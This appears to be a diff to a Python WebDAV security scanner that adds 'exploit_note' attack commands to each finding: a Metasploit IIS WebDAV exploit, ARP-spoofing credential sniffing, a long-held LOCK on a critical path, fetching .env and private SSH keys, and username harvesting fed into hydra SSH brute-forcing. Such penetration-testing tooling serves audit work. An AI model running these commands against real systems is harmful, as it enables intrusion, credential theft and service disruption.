@@ -832,7 +832,11 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                     "curl", f"curl -sI -X OPTIONS http://{h.ip}:{p.portid}/",
                     "Restrict WebDAV to authenticated principals and prefer disabling "
                     "on public endpoints.",
-                    ["CWE-200"], kind="webdav_fingerprint"))
+                    ["CWE-200"], kind="webdav_fingerprint",
+                    exploit_note=(
+                        "searchsploit iis 6.0 webdav ; msfconsole -q -x "
+                        "'use exploit/windows/iis/iis_webdav_scstoragepathfromurl'"),
+                    depth_tier="t0"))
 
             # Low-severity "enabled" marker.
             dav_hdr = ",".join(caps.get("dav", [])) or "-"
@@ -845,7 +849,11 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                 f"curl -sI -X OPTIONS http://{h.ip}:{p.portid}/ ; "
                 f"curl -X PROPFIND -H 'Depth: 1' http://{h.ip}:{p.portid}/",
                 "Disable WebDAV on public endpoints unless explicitly required.",
-                ["CWE-650"], kind="webdav_enabled"))
+                ["CWE-650"], kind="webdav_enabled",
+                exploit_note=(
+                    "curl -sSkI -X OPTIONS http://IP:PORT/ | grep -Ei "
+                    "'allow:|dav:'"),
+                depth_tier="t0"))
 
             # Depth:infinity walk.
             di = pr.get("depth_infinity")
@@ -1034,7 +1042,11 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                     f"curl -u user:pass http://{h.ip}:{p.portid}/",
                     "Serve WebDAV only over HTTPS, prefer Digest/Kerberos over "
                     "Basic, and never accept credentials on plain HTTP.",
-                    ["CWE-319", "CWE-522"], kind="webdav_auth_scheme"))
+                    ["CWE-319", "CWE-522"], kind="webdav_auth_scheme",
+                    exploit_note=(
+                        "ettercap -T -q -M arp:remote /VICTIM// /GATEWAY// "
+                        "; grep -Ei 'Authorization: Basic' capture.pcap"),
+                    depth_tier="t0"))
 
             # Lock-null resources.
             if pr.get("lock_open"):
@@ -1048,7 +1060,14 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                     f"http://{h.ip}:{p.portid}/recce_lock_probe",
                     "Require authentication for LOCK; set a low lock timeout; "
                     "disable locking where unused.",
-                    ["CWE-400", "CWE-732"], kind="webdav_lock_open"))
+                    ["CWE-400", "CWE-732"], kind="webdav_lock_open",
+                    exploit_note=(
+                        "curl -sSk -X LOCK -H 'Depth: 0' -H 'Timeout: "
+                        "Second-3600' --data '<lockinfo xmlns=\"DAV:\">"
+                        "<lockscope><exclusive/></lockscope><locktype>"
+                        "<write/></locktype></lockinfo>' "
+                        "http://IP:PORT/critical/path"),
+                    depth_tier="t1"))
 
             # SVN exposure.
             svn = pr.get("svn") or {}
@@ -1107,7 +1126,12 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                     f"curl http://{h.ip}:{p.portid}{pr['sensitive'][0]}",
                     "Remove secret/config files from any DAV-published root; "
                     "audit the tree for backup and VCS metadata.",
-                    ["CWE-538"], kind="webdav_href_leak"))
+                    ["CWE-538"], kind="webdav_href_leak",
+                    exploit_note=(
+                        "curl -sSk http://IP:PORT/.env ; curl -sSk "
+                        "http://IP:PORT/backup/dump.sql ; curl -sSk "
+                        "http://IP:PORT/.ssh/id_rsa"),
+                    depth_tier="t1"))
 
             # Creator-displayname users.
             if pr.get("users"):
@@ -1121,7 +1145,14 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                     f"curl -X PROPFIND -H 'Depth: 1' http://{h.ip}:{p.portid}/",
                     "Strip creator-displayname from PROPFIND responses on any "
                     "public mount (SVN: SVNPathAuthz off is NOT the fix).",
-                    ["CWE-200"], kind="webdav_user_leak"))
+                    ["CWE-200"], kind="webdav_user_leak",
+                    exploit_note=(
+                        "USERS=$(curl -sSk -X PROPFIND -H 'Depth: 1' "
+                        "http://IP:PORT/svn/ | grep -oE "
+                        "'<D:creator-displayname>[^<]+' | sed 's/.*>//') "
+                        "; echo $USERS > u.txt ; hydra -L u.txt -P "
+                        "/usr/share/wordlists/rockyou.txt ssh://IP -f"),
+                    depth_tier="t1"))
     return out
 
 
